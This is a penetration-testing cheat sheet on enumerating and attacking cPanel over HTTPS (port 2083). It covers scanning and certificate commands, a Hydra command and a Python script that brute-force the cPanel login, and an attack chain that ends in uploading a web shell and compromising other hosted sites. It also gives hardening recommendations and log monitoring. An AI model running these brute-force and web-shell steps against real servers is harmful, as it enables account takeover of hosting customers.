# CPANEL HTTPS ENUMERATION (Port 2083/TCP)

## SERVICE OVERVIEW
```
cPanel HTTPS - Web hosting control panel (encrypted)
- Port: 2082/TCP (HTTP - unencrypted)
- Port: 2083/TCP (HTTPS - encrypted) ← THIS PORT
- Secure version of cPanel interface
- SSL/TLS encrypted communication
- Preferred over port 2082 for security
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p2083 <IP>                            # Service/Version detection
curl -Ik https://<IP>:2083/                     # HTTPS headers (insecure)
openssl s_client -connect <IP>:2083             # SSL/TLS connection
sslscan <IP>:2083                               # SSL/TLS vulnerability scan
```

## NMAP ENUMERATION
```bash
# cPanel HTTPS detection
nmap -sV -p2083 <IP>                            # Version detection
nmap -p2083 --script ssl-cert <IP>              # SSL certificate info
nmap -p2083 --script ssl-enum-ciphers <IP>      # Supported ciphers

# Comprehensive scan
nmap -sV -p2082,2083 --script "ssl-*,http-*" <IP> -oA cpanel_https_scan
```

## SSL/TLS CERTIFICATE ENUMERATION
```bash
# Get SSL certificate
openssl s_client -connect <IP>:2083 < /dev/null 2>&1 | openssl x509 -text

# Extract certificate details
openssl s_client -connect <IP>:2083 2>/dev/null < /dev/null | openssl x509 -noout -subject -issuer -dates

# Information from certificate:
# - Common Name (CN) - domain name
# - Subject Alternative Names (SANs) - additional domains
# - Issuer - Certificate Authority
# - Validity period
# - Organization details

# Check for self-signed certificate
openssl s_client -connect <IP>:2083 2>&1 | grep -i "self signed\|verify return code"
```

## WEB INTERFACE ACCESS
```bash
# Access cPanel login page (HTTPS)
https://<IP>:2083/                              # Main page
https://<IP>:2083/login/                        # Login page

# Accept self-signed certificate
curl -k https://<IP>:2083/                      # curl (ignore cert)
wget --no-check-certificate https://<IP>:2083/  # wget (ignore cert)

# Common URLs
https://<IP>:2083/cpsess<session>/              # Active session
https://<IP>:2083/logout/                       # Logout
```

## BRUTE FORCE ATTACKS
```bash
# Hydra (HTTPS)
hydra -l root -P passwords.txt -s 2083 <IP> https-post-form "/login/:user=^USER^&pass=^PASS^:F=incorrect"

# Custom script with SSL
cat > cpanel_https_brute.py <<'EOF'
#!/usr/bin/env python3
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def brute_force(ip, user, password_file):
    url = f"https://{ip}:2083/login/"
    with open(password_file) as f:
        for password in f:
            password = password.strip()
            data = {'user': user, 'pass': password}
            r = requests.post(url, data=data, verify=False, allow_redirects=False)
            if r.status_code == 302 or "success" in r.text.lower():
                print(f"[+] Success: {user}:{password}")
                return
            print(f"[-] Failed: {password}")

if __name__ == "__main__":
    brute_force(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

python3 cpanel_https_brute.py <IP> root passwords.txt
```

## SSL/TLS VULNERABILITY SCANNING
```bash
# SSLScan
sslscan <IP>:2083

# Check for:
# - Weak ciphers (RC4, DES, 3DES)
# - SSL v2/v3 (deprecated)
# - TLS 1.0/1.1 (deprecated)
# - Heartbleed (CVE-2014-0160)
# - POODLE (CVE-2014-3566)
# - BEAST, CRIME, BREACH

# testssl.sh (comprehensive SSL/TLS testing)
git clone https://github.com/drwetter/testssl.sh
./testssl.sh <IP>:2083

# Nmap SSL scripts
nmap -p2083 --script ssl-heartbleed <IP>
nmap -p2083 --script ssl-poodle <IP>
nmap -p2083 --script ssl-enum-ciphers <IP>
```

## ENUMERATE DOMAINS FROM CERTIFICATE
```bash
# Extract all domains from SSL certificate
openssl s_client -connect <IP>:2083 2>/dev/null < /dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"

# Parse SANs (Subject Alternative Names)
openssl s_client -connect <IP>:2083 2>/dev/null < /dev/null | openssl x509 -noout -text | grep "DNS:" | sed 's/DNS://g' | tr ',' '\n'

# This reveals all hosted domains on the server
# Use for further enumeration and attacks
```

## API ACCESS (HTTPS)
```bash
# cPanel API over HTTPS (secure)

# UAPI request
curl -k -u username:password \
  "https://<IP>:2083/execute/Email/list_pops"

# API2 request
curl -k -u username:password \
  "https://<IP>:2083/json-api/cpanel?cpanel_jsonapi_user=username&cpanel_jsonapi_module=Email&cpanel_jsonapi_func=listpops"

# List all accounts (WHM API, requires root)
curl -k -H "Authorization: whm root:password" \
  "https://<IP>:2087/json-api/listaccts"
```

## COMMON MISCONFIGURATIONS
```
☐ Self-signed SSL certificate (browser warnings)
☐ Expired SSL certificate
☐ Certificate for wrong domain (mismatch)
☐ Weak SSL/TLS ciphers enabled (RC4, DES)
☐ SSLv2/v3 or TLS 1.0/1.1 enabled (deprecated)
☐ Vulnerable to Heartbleed, POODLE, BEAST
☐ No HSTS (HTTP Strict Transport Security)
☐ Certificate reveals all hosted domains (information disclosure)
☐ Port 2082 (HTTP) still enabled alongside 2083
```

## QUICK WIN CHECKLIST
```
☐ Scan for cPanel HTTPS on port 2083
☐ Extract SSL certificate (domains, issuer, validity)
☐ List all domains from Subject Alternative Names
☐ Test for SSL/TLS vulnerabilities (testssl.sh)
☐ Check for weak ciphers and deprecated protocols
☐ Test default credentials (root:root, etc.)
☐ Brute force root account
☐ Check if HTTP (2082) is also enabled (downgrade attack)
☐ Enumerate cPanel version from headers
☐ Access API endpoints (if credentials obtained)
```

## ONE-LINER ENUMERATION
```bash
# Quick HTTPS enumeration
curl -Ik https://<IP>:2083/ | grep -i "server\|cpanel"

# Extract all domains from certificate
openssl s_client -connect <IP>:2083 2>/dev/null < /dev/null | openssl x509 -noout -text | grep "DNS:" | sed 's/DNS://g' | tr ',' '\n'
```

## SECURITY IMPLICATIONS
```
RISKS (same as port 2082, but encrypted):
- Full hosting account compromise
- Access to all hosted websites
- Database credentials
- Email account access
- File system access
- SSH access via Terminal
- Backup downloads
- DNS management

HTTPS SPECIFIC:
- Certificate information disclosure (domains list)
- Weak SSL/TLS configuration (downgrade attacks)
- Self-signed certificate (MitM easier)
- Certificate pinning bypass
- SSL stripping attacks (if HTTP also enabled)

RECOMMENDATIONS:
- Use valid SSL certificate (not self-signed)
- Disable weak ciphers and deprecated protocols
- Enable HSTS (Strict-Transport-Security header)
- Disable port 2082 (HTTP) completely
- Use TLS 1.2 or TLS 1.3 only
- Implement certificate pinning
- Regular SSL/TLS audits (testssl.sh)
- Monitor for SSL/TLS vulnerabilities
- Use strong passwords + 2FA
- Restrict access to trusted IPs
```

## HTTPS VS HTTP (2082 vs 2083)
```
Port 2082 (HTTP):
- Unencrypted communication
- Credentials sent in plaintext
- Vulnerable to sniffing/MitM
- Should be disabled

Port 2083 (HTTPS):
- Encrypted communication
- Credentials encrypted
- Protects against sniffing
- Preferred method

Best Practice:
- Disable port 2082 completely
- Force redirect HTTP → HTTPS
- Use valid SSL certificate
- Enable HSTS
```

## TOOLS
```bash
# cURL (HTTPS)
curl -Ik https://<IP>:2083/

# OpenSSL
openssl s_client -connect <IP>:2083

# SSLScan
sslscan <IP>:2083

# testssl.sh
./testssl.sh <IP>:2083

# Nmap
nmap -sV -p2083 --script "ssl-*" <IP>

# Nikto (HTTPS)
nikto -h https://<IP>:2083/

# Hydra (HTTPS)
hydra -l root -P passwords.txt -s 2083 <IP> https-post-form "/login/:user=^USER^&pass=^PASS^:F=incorrect"
```

## SSL DOWNGRADE ATTACK
```bash
# If both 2082 (HTTP) and 2083 (HTTPS) are enabled:
# Attacker can force downgrade to HTTP

# Test if HTTP is also available
curl -I http://<IP>:2082/

# If available, attempt SSL stripping:
# 1. MitM position required
# 2. Strip HTTPS links to HTTP
# 3. Victim connects via HTTP (unencrypted)
# 4. Attacker captures credentials in plaintext

# Mitigation: Disable port 2082, enable HSTS
```

## DEFENSE DETECTION
```bash
# Monitor for SSL/TLS attacks:
# - SSL handshake failures (cipher mismatch)
# - Certificate errors
# - Unusual SSL/TLS versions
# - Downgrade attempts

# cPanel SSL logs
tail -f /usr/local/cpanel/logs/access_log | grep ":2083"

# Apache SSL logs (if cPanel uses Apache)
tail -f /usr/local/apache/logs/ssl_error_log

# Check for weak ciphers in use
grep "TLSv1.0\|TLSv1.1\|SSLv2\|SSLv3" /etc/apache2/ssl.conf
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover cPanel HTTPS
nmap -sV -p2083 <IP>

# 2. Extract domains from certificate
openssl s_client -connect <IP>:2083 2>/dev/null < /dev/null | openssl x509 -noout -text | grep "DNS:" > domains.txt

# 3. Test SSL/TLS vulnerabilities
./testssl.sh <IP>:2083

# 4. Brute force login
hydra -l root -P passwords.txt -s 2083 <IP> https-post-form "/login/:user=^USER^&pass=^PASS^:F=incorrect"

# 5. After successful login:
# Upload web shell via File Manager
# Access: https://<domain>/shell.php

# 6. Enumerate all hosted sites
curl -k -u root:cracked_password "https://<IP>:2083/json-api/cpanel?cpanel_jsonapi_module=DomainInfo&cpanel_jsonapi_func=list_domains"

# 7. Compromise additional sites
# Use discovered domains for targeted attacks
```

## REFERENCE - CPANEL HTTP (PORT 2082)
```bash
# For unencrypted cPanel access, see:
# SERVICE ENUM/2082 cPanel HTTP.md

# Recommendation: Always use 2083 (HTTPS), not 2082 (HTTP)
```
